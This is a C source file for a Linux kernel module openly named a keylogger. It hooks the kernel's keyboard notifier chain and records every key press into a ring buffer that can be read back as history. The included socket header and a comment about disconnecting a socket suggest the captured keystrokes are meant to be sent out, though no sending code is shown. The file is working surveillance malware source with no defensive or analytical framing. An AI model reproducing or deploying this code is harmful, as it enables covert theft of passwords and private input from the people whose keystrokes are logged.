#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/slab.h>

#include "keylogger.h"
#include "socket.h"

char buffer[BUFFER_SIZE] = {'\0'};
int fill = 0;
void save_key(char key)
{
    buffer[fill] = key;
    fill = (fill + 1) % BUFFER_SIZE;
}

char *read_key_history(void)
{
    int num_items_to_consume = BUFFER_SIZE;
    int consumed_count = 0;
    char *consumed_items = (char *)kmalloc(
        num_items_to_consume * sizeof(char), GFP_KERNEL);

    if (!consumed_items)
    {
        printk(KERN_ERR
               "Failed to allocate memory for consumed items\n");
        return NULL;
    }

    while (consumed_count < num_items_to_consume)
    {
        char item = buffer[(fill - consumed_count - 1 + BUFFER_SIZE) %
                           BUFFER_SIZE];

        consumed_items[consumed_count] = item;
        consumed_count++;
    }

    return consumed_items;
}

int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_param)
{
    struct keyboard_notifier_param *param = _param;

    if (code == KBD_KEYCODE && param->down)
    {
        char key;

        // Convert keycode to character
        key = param->value;
        save_key(key);
    }

    return NOTIFY_OK;
}

struct notifier_block keylogger_nb = {
    .notifier_call = keylogger_notify,
};

int __init keylogger_init(void)
{
    // Register the keylogger
    int res = register_keyboard_notifier(&keylogger_nb);

    if (res != 0)
    {
        printk(KERN_ERR "Failed to register keylogger\n");
        return res;
    }

    printk(KERN_INFO "Keylogger module initialized\n");
    return 0;
}

void keylogger_exit(void)
{
    // Unregister the keylogger
    int res = unregister_keyboard_notifier(&keylogger_nb);

    // Disconnect and release the socket
    if (res != 0)
    {
        printk(KERN_ERR "Failed to unregister keylogger\n");
    }

    printk(KERN_INFO "Keylogger module exited\n");
}